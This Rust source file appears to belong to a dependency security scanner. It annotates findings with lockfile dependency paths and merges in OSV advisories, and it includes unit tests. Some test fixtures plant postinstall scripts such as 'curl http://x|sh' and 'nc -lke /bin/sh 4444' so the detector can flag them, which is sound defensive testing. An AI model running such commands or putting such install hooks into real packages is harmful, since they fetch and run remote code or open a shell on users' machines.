/// Per-lockfile graph status, returned alongside annotated findings so
/// the CLI can render an honest "Paths: X (graph), Y (flat)" banner row
/// whenever at least one lockfile in the scan couldn't yield a graph.
#[derive(Debug, Clone)]
pub struct LockfileGraphInfo {
    pub path: PathBuf,
    pub format: sca_lockfile::LockfileFormat,
    pub graph_supported: bool,
}

/// Output of [`scan_project_with_paths`] / [`scan_project_with_osv_paths`].
/// The findings are already path-annotated; `lockfiles` is the per-format
/// summary the CLI banner needs to honestly indicate which lockfiles
/// have transitive data and which are flat.
#[derive(Debug, Clone)]
pub struct PathScanResult {
    pub findings: Vec<Finding>,
    pub lockfiles: Vec<LockfileGraphInfo>,
}

/// Embedded-DB scan that additionally annotates each finding with its
/// shortest dependency paths from the project root. Wraps [`scan_project`]
/// — the underlying threat-matching is identical, only the post-processing
/// differs.
pub fn scan_project_with_paths(
    path: &Path,
    check_system: bool,
    threats: &[Threat],
) -> PathScanResult {
    let findings = scan_project(path, check_system, threats);
    annotate_findings_with_paths(path, findings)
}

/// Embedded-DB + OSV scan with path annotation. Wraps
/// [`scan_project_with_osv`]; OSV-only findings flow through the same
/// path resolver as embedded ones.
pub fn scan_project_with_osv_paths(
    path: &Path,
    check_system: bool,
    threats: &[Threat],
    osv_opts: &OsvOptions,
) -> PathScanResult {
    let findings = scan_project_with_osv(path, check_system, threats, osv_opts);
    annotate_findings_with_paths(path, findings)
}

/// Build per-lockfile graphs once, then annotate every finding by
/// matching `Finding.location` against the lockfile that produced its
/// graph. Findings whose location doesn't map to a graph-supported
/// lockfile (e.g. Pipfile.lock, yarn Berry, `node_modules/` walks) keep
/// the empty defaults.
fn annotate_findings_with_paths(project_path: &Path, mut findings: Vec<Finding>) -> PathScanResult {
    let lockfile_paths = sca_lockfile::discover_lockfiles(project_path);
    let mut lockfiles: Vec<LockfileGraphInfo> = Vec::new();
    let mut graphs: Vec<(PathBuf, sca_graph::DepGraph)> = Vec::new();

    for lockfile_path in lockfile_paths {
        let format = match sca_lockfile::detect_format(&lockfile_path) {
            Some(f) => f,
            None => continue,
        };
        let graph = sca_lockfile::build_graph(&lockfile_path);
        let graph_supported = graph.is_some();
        if let Some(g) = graph {
            graphs.push((lockfile_path.clone(), g));
        }
        lockfiles.push(LockfileGraphInfo {
            path: lockfile_path,
            format,
            graph_supported,
        });
    }

    for f in &mut findings {
        for (lf_path, graph) in &graphs {
            if f.location == lf_path.display().to_string() {
                if let Some(node_id) = graph.find_node(&f.ecosystem, &f.package, &f.version) {
                    let paths = graph.all_paths_to(node_id, DEFAULT_PATH_CAP);
                    f.path_count = paths.len();
                    f.paths = paths;
                }
                break;
            }
        }
    }

    PathScanResult {
        findings,
        lockfiles,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn write(path: &Path, content: &str) {
        if let Some(parent) = path.parent() {
            fs::create_dir_all(parent).unwrap();
        }
        fs::write(path, content).unwrap();
    }

    fn tempdir() -> tempfile::TempDir {
        tempfile::tempdir().unwrap()
    }

    #[test]
    fn discover_manifests_lists_files_in_canonical_order() {
        let dir = tempdir();
        write(&dir.path().join("package-lock.json"), "{}");
        write(&dir.path().join("requirements.txt"), "");
        write(&dir.path().join("yarn.lock"), "");
        let found: Vec<_> = discover_manifests(dir.path())
            .iter()
            .map(|p| p.file_name().unwrap().to_string_lossy().into_owned())
            .collect();
        assert_eq!(
            found,
            vec![
                "package-lock.json".to_string(),
                "yarn.lock".to_string(),
                "requirements.txt".to_string()
            ]
        );
    }

    #[test]
    fn detects_rollup_range_in_lockfile_v3() {
        let dir = tempdir();
        let lockfile = dir.path().join("package-lock.json");
        let body = r#"{
            "name": "demo",
            "version": "1.0.0",
            "lockfileVersion": 3,
            "packages": {
                "node_modules/rollup": {"version": "4.21.0"},
                "node_modules/safe-pkg": {"version": "1.0.0"}
            }
        }"#;
        fs::write(&lockfile, body).unwrap();
        let threats = Threat::load_all();
        let findings = scan_project(dir.path(), false, &threats);
        let rollup: Vec<_> = findings.iter().filter(|f| f.package == "rollup").collect();
        assert_eq!(rollup.len(), 1, "expected exactly one rollup finding");
        assert_eq!(rollup[0].version, "4.21.0");
        assert_eq!(rollup[0].severity, "high");
    }

    #[test]
    fn does_not_flag_patched_rollup() {
        let dir = tempdir();
        let body = r#"{
            "lockfileVersion": 3,
            "packages": {
                "node_modules/rollup": {"version": "4.22.4"}
            }
        }"#;
        fs::write(dir.path().join("package-lock.json"), body).unwrap();
        let threats = Threat::load_all();
        let findings = scan_project(dir.path(), false, &threats);
        assert!(
            !findings.iter().any(|f| f.package == "rollup"),
            "patched rollup should not be flagged"
        );
    }

    #[test]
    fn detects_urllib3_range_in_requirements() {
        let dir = tempdir();
        fs::write(
            dir.path().join("requirements.txt"),
            "urllib3==1.26.18\nrequests==2.31.0\n",
        )
        .unwrap();
        let threats = Threat::load_all();
        let findings = scan_project(dir.path(), false, &threats);
        let names: HashSet<_> = findings.iter().map(|f| f.package.clone()).collect();
        assert!(names.contains("urllib3"), "should flag urllib3");
        // requests is in the seed DB too; we only assert urllib3 since the
        // other depends on the seed evolving.
    }

    #[test]
    fn normalizes_pypi_underscore_form() {
        let dir = tempdir();
        fs::write(
            dir.path().join("requirements.txt"),
            "python3_dateutil==2.9.1\n",
        )
        .unwrap();
        let threats = Threat::load_all();
        let findings = scan_project(dir.path(), false, &threats);
        assert!(
            findings.iter().any(|f| f.package == "python3-dateutil"),
            "underscore form should normalise to dash and hit the typosquat seed"
        );
    }

    #[test]
    fn detects_axios_exact_version_in_lockfile() {
        let dir = tempdir();
        let body = r#"{
            "lockfileVersion": 3,
            "packages": {
                "node_modules/axios": {"version": "1.14.1"}
            }
        }"#;
        fs::write(dir.path().join("package-lock.json"), body).unwrap();
        let threats = Threat::load_all();
        let findings = scan_project(dir.path(), false, &threats);
        let axios: Vec<_> = findings.iter().filter(|f| f.package == "axios").collect();
        assert_eq!(axios.len(), 1);
        assert_eq!(axios[0].severity, "critical");
    }

    #[test]
    fn finding_dedup_by_pkg_version_location() {
        // Two-track entry hits both `malicious_versions` and a substring
        // trojanized_dep within the same yarn.lock would yield two rows
        // pre-dedup; verify we keep only the first per `(pkg, ver, loc)`.
        let dir = tempdir();
        // Synthetic minimal yarn.lock so we exercise the dedup path.
        // (Real-world dedup primarily protects against the same package
        // showing in v2/v3 packages AND v1 dependencies.)
        let lock_body = r#"{
            "lockfileVersion": 3,
            "packages": {
                "node_modules/axios": {"version": "1.14.1"}
            },
            "dependencies": {
                "axios": {"version": "1.14.1"}
            }
        }"#;
        fs::write(dir.path().join("package-lock.json"), lock_body).unwrap();
        let threats = Threat::load_all();
        let findings = scan_project(dir.path(), false, &threats);
        let axios: Vec<_> = findings.iter().filter(|f| f.package == "axios").collect();
        assert_eq!(
            axios.len(),
            1,
            "duplicate (pkg, ver, loc) should be deduped"
        );
    }

    // ── OSV layer tests ───────────────────────────────────────────────────

    use crate::osv::{OsvReference, OsvSeverity, OsvVuln};
    use crate::osv_cache::{cache_key, CacheEntry, OsvCache};

    fn osv_vuln(id: &str, summary: &str, score: Option<&str>) -> OsvVuln {
        OsvVuln {
            id: id.into(),
            summary: summary.into(),
            severity: score
                .map(|s| OsvSeverity {
                    kind: "CVSS_V3".into(),
                    score: s.into(),
                })
                .into_iter()
                .collect(),
            references: vec![OsvReference {
                kind: "WEB".into(),
                url: format!("https://github.com/advisories/{id}"),
            }],
        }
    }

    #[test]
    fn enumerate_packages_walks_lockfile_v3() {
        let dir = tempdir();
        let body = r#"{
            "lockfileVersion": 3,
            "packages": {
                "": {"name":"root"},
                "node_modules/axios": {"version": "1.14.1"},
                "node_modules/lodash": {"version": "4.17.21"}
            }
        }"#;
        fs::write(dir.path().join("package-lock.json"), body).unwrap();
        let pkgs = enumerate_packages(dir.path());
        let names: HashSet<String> = pkgs.iter().map(|p| p.name.clone()).collect();
        assert!(names.contains("axios"));
        assert!(names.contains("lodash"));
        // Empty `""` key should not produce a row.
        assert!(!names.contains(""));
        // Every row must have ecosystem npm + non-empty version.
        for p in &pkgs {
            assert_eq!(p.ecosystem, "npm");
            assert!(!p.version.is_empty());
        }
    }

    #[test]
    fn enumerate_packages_walks_requirements_txt() {
        let dir = tempdir();
        fs::write(
            dir.path().join("requirements.txt"),
            "axios==1.0.0\nurllib3==1.26.18\n# comment\nrequests >= 2.0\n",
        )
        .unwrap();
        let pkgs = enumerate_packages(dir.path());
        let names: HashSet<String> = pkgs.iter().map(|p| p.name.clone()).collect();
        assert!(names.contains("urllib3"));
        // `requests >= 2.0` doesn't have a `==` pin, so it's not enumerated.
        assert!(!names.contains("requests"));
    }

    #[test]
    fn enumerate_packages_dedupes_by_eco_name_version() {
        let dir = tempdir();
        // Same package in v2/v3 packages map AND v1 dependencies map.
        let body = r#"{
            "lockfileVersion": 3,
            "packages": {
                "node_modules/axios": {"version": "1.14.1"}
            },
            "dependencies": {
                "axios": {"version": "1.14.1"}
            }
        }"#;
        fs::write(dir.path().join("package-lock.json"), body).unwrap();
        let pkgs = enumerate_packages(dir.path());
        let axios: Vec<_> = pkgs.iter().filter(|p| p.name == "axios").collect();
        assert_eq!(axios.len(), 1, "duplicate (eco,name,ver) should dedupe");
    }

    #[test]
    fn osv_to_finding_maps_fields() {
        let pkg = PackageRef {
            ecosystem: "npm".into(),
            name: "axios".into(),
            version: "1.14.1".into(),
            location: "/tmp/demo/package-lock.json".into(),
        };
        let vuln = osv_vuln("GHSA-test-9999", "metadata exfil bug", Some("9.5"));
        let finding = osv_to_finding(&pkg, &vuln);
        assert_eq!(finding.package, "axios");
        assert_eq!(finding.version, "1.14.1");
        assert_eq!(finding.severity, "critical");
        assert_eq!(finding.attack_vector, "metadata exfil bug");
        assert!(finding.source.starts_with("osv:"));
        assert!(finding.source.contains("GHSA-test-9999"));
        assert_eq!(finding.references.len(), 1);
        assert!(finding.remediation.contains("GHSA-test-9999"));
    }

    #[test]
    fn osv_to_finding_handles_missing_summary() {
        let pkg = PackageRef {
            ecosystem: "pypi".into(),
            name: "p".into(),
            version: "0.1".into(),
            location: "loc".into(),
        };
        let vuln = osv_vuln("GHSA-x", "", None);
        let finding = osv_to_finding(&pkg, &vuln);
        assert!(finding.attack_vector.contains("GHSA-x"));
        assert_eq!(finding.severity, "unknown");
    }

    #[test]
    fn augment_with_osv_offline_returns_cached_findings() {
        let dir = tempdir();
        let cache_path = dir.path().join("osv-cache.json");
        let mut cache = OsvCache::empty();
        cache.entries.insert(
            cache_key("npm", "axios", "1.14.1"),
            CacheEntry {
                fetched_at: crate::osv_cache::unix_now(),
                vulns: vec![osv_vuln("GHSA-osv-1", "axios metadata exfil", Some("9.1"))],
            },
        );
        cache.save(&cache_path).unwrap();

        let pkgs = vec![PackageRef {
            ecosystem: "npm".into(),
            name: "axios".into(),
            version: "1.14.1".into(),
            location: "/tmp/demo/package-lock.json".into(),
        }];
        let opts = OsvOptions {
            cache_path: Some(cache_path),
            use_cache: true,
            offline: true,
            timeout: Duration::from_secs(5),
        };
        let findings = augment_with_osv(&pkgs, &opts);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].source, "osv:GHSA-osv-1");
        assert_eq!(findings[0].severity, "critical");
    }

    #[test]
    fn augment_with_osv_offline_skips_uncached_packages() {
        let dir = tempdir();
        let cache_path = dir.path().join("osv-cache.json");
        // Empty cache file.
        OsvCache::empty().save(&cache_path).unwrap();
        let pkgs = vec![PackageRef {
            ecosystem: "npm".into(),
            name: "uncached-pkg".into(),
            version: "1.0.0".into(),
            location: "loc".into(),
        }];
        let opts = OsvOptions {
            cache_path: Some(cache_path),
            use_cache: true,
            offline: true,
            timeout: Duration::from_secs(5),
        };
        let findings = augment_with_osv(&pkgs, &opts);
        assert!(
            findings.is_empty(),
            "offline mode must not invent findings for uncached packages"
        );
    }

    #[test]
    fn augment_with_osv_skips_stale_cache_entry_when_offline() {
        let dir = tempdir();
        let cache_path = dir.path().join("osv-cache.json");
        let mut cache = OsvCache::empty();
        cache.entries.insert(
            cache_key("npm", "axios", "1.14.1"),
            CacheEntry {
                // Stale: fetched_at == 0 is well past the 24h TTL.
                fetched_at: 0,
                vulns: vec![osv_vuln("GHSA-stale", "stale", Some("9.0"))],
            },
        );
        cache.save(&cache_path).unwrap();

        let pkgs = vec![PackageRef {
            ecosystem: "npm".into(),
            name: "axios".into(),
            version: "1.14.1".into(),
            location: "loc".into(),
        }];
        let opts = OsvOptions {
            cache_path: Some(cache_path),
            use_cache: true,
            offline: true,
            timeout: Duration::from_secs(5),
        };
        let findings = augment_with_osv(&pkgs, &opts);
        assert!(findings.is_empty(), "stale entries must not be served");
    }

    #[test]
    fn scan_project_with_osv_dedupes_against_embedded() {
        let dir = tempdir();
        // axios@1.14.1 — embedded DB hits this as critical.
        let body = r#"{
            "lockfileVersion": 3,
            "packages": {
                "node_modules/axios": {"version": "1.14.1"}
            }
        }"#;
        fs::write(dir.path().join("package-lock.json"), body).unwrap();

        // Pre-populate the cache so OSV would also report axios.
        let cache_path = dir.path().join("osv-cache.json");
        let mut cache = OsvCache::empty();
        cache.entries.insert(
            cache_key("npm", "axios", "1.14.1"),
            CacheEntry {
                fetched_at: crate::osv_cache::unix_now(),
                vulns: vec![osv_vuln("GHSA-osv-dup", "axios via OSV", Some("9.0"))],
            },
        );
        cache.save(&cache_path).unwrap();

        let opts = OsvOptions {
            cache_path: Some(cache_path),
            use_cache: true,
            offline: true,
            timeout: Duration::from_secs(5),
        };
        let threats = Threat::load_all();
        let findings = scan_project_with_osv(dir.path(), false, &threats, &opts);
        let axios: Vec<_> = findings.iter().filter(|f| f.package == "axios").collect();
        assert_eq!(
            axios.len(),
            1,
            "embedded + OSV agreement on axios@1.14.1 should dedupe to one row"
        );
        // Embedded entry should win — its source is not `osv:*`.
        assert!(!axios[0].source.starts_with("osv:"));
    }

    #[test]
    fn scan_project_with_osv_emits_osv_only_findings() {
        let dir = tempdir();
        // safe-pkg has no embedded DB entry; OSV cache says it's vulnerable.
        let body = r#"{
            "lockfileVersion": 3,
            "packages": {
                "node_modules/safe-pkg": {"version": "1.0.0"}
            }
        }"#;
        fs::write(dir.path().join("package-lock.json"), body).unwrap();

        let cache_path = dir.path().join("osv-cache.json");
        let mut cache = OsvCache::empty();
        cache.entries.insert(
            cache_key("npm", "safe-pkg", "1.0.0"),
            CacheEntry {
                fetched_at: crate::osv_cache::unix_now(),
                vulns: vec![osv_vuln(
                    "GHSA-only-osv",
                    "advisory only on osv",
                    Some("7.5"),
                )],
            },
        );
        cache.save(&cache_path).unwrap();

        let opts = OsvOptions {
            cache_path: Some(cache_path),
            use_cache: true,
            offline: true,
            timeout: Duration::from_secs(5),
        };
        let threats = Threat::load_all();
        let findings = scan_project_with_osv(dir.path(), false, &threats, &opts);
        let osv_only: Vec<_> = findings
            .iter()
            .filter(|f| f.package == "safe-pkg")
            .collect();
        assert_eq!(osv_only.len(), 1);
        assert!(osv_only[0].source.starts_with("osv:"));
        assert_eq!(osv_only[0].severity, "high");
    }

    // ── path-annotation layer (item 5) ────────────────────────────────────

    #[test]
    fn finding_default_paths_empty_and_path_count_zero() {
        // Embedded scan path leaves the new fields untouched so callers
        // that don't opt into the path layer don't pay graph-build cost.
        let dir = tempdir();
        let body = r#"{
            "lockfileVersion": 3,
            "packages": {
                "node_modules/axios": {"version": "1.14.1"}
            }
        }"#;
        fs::write(dir.path().join("package-lock.json"), body).unwrap();
        let threats = Threat::load_all();
        let findings = scan_project(dir.path(), false, &threats);
        let axios = findings.iter().find(|f| f.package == "axios").unwrap();
        assert!(axios.paths.is_empty());
        assert_eq!(axios.path_count, 0);
    }

    #[test]
    fn scan_project_with_paths_annotates_direct_dep() {
        let dir = tempdir();
        let body = r#"{
            "name": "your-app",
            "lockfileVersion": 3,
            "packages": {
                "": {"name": "your-app", "version": "1.0.0", "dependencies": {"axios": "^1"}},
                "node_modules/axios": {"version": "1.14.1"}
            }
        }"#;
        fs::write(dir.path().join("package-lock.json"), body).unwrap();
        let threats = Threat::load_all();
        let result = scan_project_with_paths(dir.path(), false, &threats);
        let axios = result
            .findings
            .iter()
            .find(|f| f.package == "axios")
            .unwrap();
        assert_eq!(axios.path_count, 1);
        assert_eq!(axios.paths, vec![vec!["your-app".to_string()]]);
    }

    #[test]
    fn scan_project_with_paths_annotates_transitive_diamond() {
        let dir = tempdir();
        let body = r#"{
            "lockfileVersion": 3,
            "packages": {
                "": {"name": "your-app", "version": "1.0.0", "dependencies": {"alpha": "^1", "bravo": "^1"}},
                "node_modules/alpha": {"version": "1.0.0", "dependencies": {"axios": "^1"}},
                "node_modules/bravo": {"version": "1.0.0", "dependencies": {"axios": "^1"}},
                "node_modules/axios": {"version": "1.14.1"}
            }
        }"#;
        fs::write(dir.path().join("package-lock.json"), body).unwrap();
        let threats = Threat::load_all();
        let result = scan_project_with_paths(dir.path(), false, &threats);
        let axios = result
            .findings
            .iter()
            .find(|f| f.package == "axios")
            .unwrap();
        assert_eq!(axios.path_count, 2, "diamond should yield 2 paths");
        // Each path is depth 2 (root → alpha/bravo, axios excluded).
        for p in &axios.paths {
            assert_eq!(p.len(), 2);
            assert_eq!(p[0], "your-app");
        }
    }

    #[test]
    fn scan_project_with_paths_marks_pipfile_as_flat() {
        let dir = tempdir();
        let body = r#"{
            "_meta": {"hash": {"sha256": "x"}},
            "default": {"axios": {"version": "==1.14.1"}}
        }"#;
        fs::write(dir.path().join("Pipfile.lock"), body).unwrap();
        let threats = Threat::load_all();
        let result = scan_project_with_paths(dir.path(), false, &threats);
        let pipfile_info = result
            .lockfiles
            .iter()
            .find(|l| l.format == sca_lockfile::LockfileFormat::PipfileLock)
            .expect("Pipfile.lock should be discovered");
        assert!(!pipfile_info.graph_supported);
    }

    #[test]
    fn scan_project_with_paths_lockfiles_lists_npm_v3_as_supported() {
        let dir = tempdir();
        let body = r#"{
            "lockfileVersion": 3,
            "packages": {"": {}, "node_modules/x": {"version": "1.0.0"}}
        }"#;
        fs::write(dir.path().join("package-lock.json"), body).unwrap();
        let threats = Threat::load_all();
        let result = scan_project_with_paths(dir.path(), false, &threats);
        assert_eq!(result.lockfiles.len(), 1);
        assert!(result.lockfiles[0].graph_supported);
    }

    #[test]
    fn finding_serializes_path_count_as_camel_case() {
        // Sentinel-pin: locks the JSON schema so any future renamer
        // (e.g. someone adding `arcis sca --json`) sees the camelCase
        // contract on day one. We assert against the literal serialized
        // text rather than going through serde_json::Value lookups so a
        // rename is caught in the diff, not just by clients.
        let f = Finding {
            package: "axios".into(),
            ecosystem: "npm".into(),
            version: "1.14.1".into(),
            severity: "critical".into(),
            location: "/p".into(),
            attack_vector: String::new(),
            remediation: String::new(),
            source: String::new(),
            references: Vec::new(),
            finding_type: FindingType::CompromisedVersion,
            paths: vec![vec!["root".into(), "a".into()]],
            path_count: 1,
        };
        let json = serde_json::to_string(&f).unwrap();
        assert!(
            json.contains("\"pathCount\":1"),
            "expected pathCount in {json}"
        );
        assert!(
            json.contains("\"paths\":[[\"root\",\"a\"]]"),
            "expected paths in {json}"
        );
        assert!(
            json.contains("\"findingType\":\"compromised_version\""),
            "expected camelCase findingType + snake_case enum value in {json}"
        );
        assert!(
            json.contains("\"attackVector\":"),
            "expected camelCase attackVector in {json}"
        );
    }

    // ── postinstall sweep wire-up (item 8) ───────────────────────────

    #[test]
    fn scan_project_runs_postinstall_sweep_unconditionally() {
        let dir = tempdir();
        write(
            &dir.path().join("node_modules/evil/package.json"),
            r#"{"name":"evil","version":"1.0.0","scripts":{"postinstall":"curl http://x|sh"}}"#,
        );
        let threats = Threat::load_all();
        // check_system=false: postinstall sweep still runs because it's
        // project-local and has no system side effects.
        let findings = scan_project(dir.path(), false, &threats);
        let postinstall_hits: Vec<&Finding> = findings
            .iter()
            .filter(|f| f.finding_type == FindingType::PersistenceArtifact)
            .collect();
        assert_eq!(
            postinstall_hits.len(),
            1,
            "scan_project must wire postinstall sweep regardless of check_system"
        );
        assert_eq!(postinstall_hits[0].package, "evil");
        assert!(postinstall_hits[0].location.ends_with(":postinstall"));
    }

    #[test]
    fn scan_project_dedupes_postinstall_findings() {
        // Two entries with identical (package, version, location) get
        // collapsed by the seen-set; here we just assert the wire-up
        // doesn't duplicate-emit on a single manifest with one bad script.
        let dir = tempdir();
        write(
            &dir.path().join("node_modules/evil/package.json"),
            r#"{"name":"evil","version":"1.0.0","scripts":{"postinstall":"curl http://x|sh"}}"#,
        );
        let threats = Threat::load_all();
        let findings = scan_project(dir.path(), false, &threats);
        let postinstall: Vec<&Finding> = findings
            .iter()
            .filter(|f| f.finding_type == FindingType::PersistenceArtifact)
            .collect();
        assert_eq!(postinstall.len(), 1, "single bad script → single finding");
    }

    #[test]
    fn scan_project_with_paths_leaves_postinstall_path_data_empty() {
        // Postinstall findings carry `location = "<manifest>:postinstall"`
        // which doesn't match any lockfile path, so the graph annotator
        // must leave paths/path_count at the defaults set by build_finding.
        let dir = tempdir();
        write(
            &dir.path().join("node_modules/evil/package.json"),
            r#"{"name":"evil","version":"1.0.0","scripts":{"postinstall":"nc -lke /bin/sh 4444"}}"#,
        );
        let threats = Threat::load_all();
        let result = scan_project_with_paths(dir.path(), false, &threats);
        let postinstall: Vec<&Finding> = result
            .findings
            .iter()
            .filter(|f| f.finding_type == FindingType::PersistenceArtifact)
            .collect();
        assert_eq!(postinstall.len(), 1);
        assert!(postinstall[0].paths.is_empty());
        assert_eq!(postinstall[0].path_count, 0);
    }

    #[test]
    fn scan_project_postinstall_attack_vector_cites_event_stream() {
        // Pin the historical-incident reference so it doesn't drift to
        // a generic "supply chain attack" string. event-stream and
        // ua-parser-js are the load-bearing precedents this sweep targets.
        let dir = tempdir();
        write(
            &dir.path().join("node_modules/evil/package.json"),
            r#"{"name":"evil","version":"1.0.0","scripts":{"postinstall":"curl http://x|sh"}}"#,
        );
        let threats = Threat::load_all();
        let findings = scan_project(dir.path(), false, &threats);
        let v = &findings
            .iter()
            .find(|f| f.finding_type == FindingType::PersistenceArtifact)
            .expect("postinstall finding")
            .attack_vector;
        assert!(v.contains("event-stream"), "must cite event-stream");
        assert!(v.contains("ua-parser-js"), "must cite ua-parser-js");
    }
}
